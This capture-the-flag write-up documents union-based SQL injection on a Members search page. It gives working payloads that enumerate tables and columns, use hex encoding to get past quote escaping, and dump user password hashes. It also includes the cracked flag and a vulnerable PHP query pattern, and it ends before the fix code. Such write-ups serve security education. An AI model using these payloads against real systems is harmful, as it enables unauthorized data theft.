# SQL_Injection_Members - Documentation

## How I Found It

I navigated to the **Members** search page (`index.php?page=member`). I noticed it takes an `ID` input to display user details. By inputting `1 OR 1=1`, the page dumped a list of all users, confirming that the input is directly interacting with the database without sanitization.

## Exploitation Steps

1.  **Enumeration:** I determined the number of columns using `1 UNION SELECT 1, 2`. The result showed 2 visible columns.
2.  **Table Extraction:** I retrieved the table name (`users`) by injecting:
    `1 UNION SELECT table_name, 1 FROM information_schema.tables`
3.  **Column Extraction:** I retrieved column names. To bypass the quote filter (magic quotes/addslashes), I used the Hex encoding of "users" (`0x7573657273`):
    `1 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name=0x7573657273`
    I found interesting columns: `Commentaire` and `countersign`.
4.  **Data Extraction:** I dumped the data:
    `1 UNION SELECT Commentaire, countersign FROM users`
5.  **Deciphering the Flag:**
    - The last user had a specific instruction: _"Decrypt this password -> then lower all the char. Sh256 on it and it's good !"_
    - The countersign was `5ff9d0165b4f92b14994e5c685cdce28`.
    - **Decrypt MD5:** `5ff9d0165b4f92b14994e5c685cdce28` -> "FortyTwo".
    - **Lowercase:** "fortytwo".
    - **SHA-256:** `echo -n "fortytwo" | shasum -a 256`

## Proof

**Flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc8327950c872c55`

**Vulnerability Type:**

- **OWASP A03:2021 - Injection** (formerly A1:2017 - Injection).
- Specifically: **Union-Based SQL Injection**.

## How to Fix

The vulnerability exists because the code directly concatenates the user input `$id` into the SQL query string.

## The Fix (Type Casting)

Since the `id` parameter is supposed to be a number, the simplest solution is to force PHP to treat the input as an integer. This instantly neutralizes any SQL commands because words like "UNION" become "0".

**Vulnerable Code:**

```php
$id = $_GET['id'];
// $id contains "1 UNION SELECT..."
$query = "SELECT * FROM users WHERE id = $id";
```
